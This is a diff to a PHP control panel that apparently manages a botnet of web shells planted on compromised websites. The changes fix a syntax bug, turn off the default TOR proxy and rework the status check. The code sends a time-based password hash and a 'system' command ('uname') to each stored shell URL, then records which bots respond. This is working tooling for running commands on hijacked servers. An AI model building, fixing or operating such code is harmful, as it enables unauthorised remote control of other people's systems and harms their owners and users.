@@ -15,7 +15,7 @@ error_reporting(E_ALL);
 date_default_timezone_set('Europe/London');
 
 // Proxy -  Default TOR connection - 127.0.0.1:9050
-define('USE_PROXY', 1); //0 - No proxy, 1 - Use proxy
+define('USE_PROXY', 0); //0 - No proxy, 1 - Use proxy
 define('PROXY_IP', '127.0.0.1');
 define('PROXY_PORT', '9050');
 
@@ -146,12 +146,15 @@ function showbots() {
 		$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
-			statdos = 'OK';
 		} else {
 			$status = 'BAD';
-			$statdos = 'BAD';
 		}
 		
+		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
+   			$statdos = 'OK';
+		} else {
+    		$statdos = 'BAD';
+		}
     
 echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
 }
@@ -186,7 +189,7 @@ $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
-$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $status = 'OK';
 $os = explode("{:|", $source);
